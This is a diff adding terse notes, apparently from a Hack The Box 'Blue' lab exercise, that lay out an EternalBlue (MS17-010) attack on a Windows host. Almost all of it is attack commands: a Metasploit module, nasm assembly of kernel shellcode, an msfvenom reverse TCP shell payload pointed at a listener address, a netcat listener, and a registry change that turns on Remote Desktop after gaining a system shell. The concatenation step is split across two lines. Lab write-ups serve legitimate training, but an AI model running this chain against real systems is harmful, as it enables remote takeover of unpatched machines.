@@ -1,0 +1,22 @@
+MSF: 
+use exploit/windows/smb/ms17_010_psexec
+
+Manual: https://wiki.jacobshodd.com/writeups/hack-the-box/blue
+
+cd MS17-010/shellcode
+
+
+nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin
+
+
+
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o revshell64_10101040.bin EXITFUNC=thread LHOST=10.10.14.9 LPORT=6789
+
+cat eternalblue_kshellcode_x64.bin
+
+ revshell64_10101040.bin > 10.10.10.40.payload.bin
+
+nc -nlvp 6789
+Got system shell
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
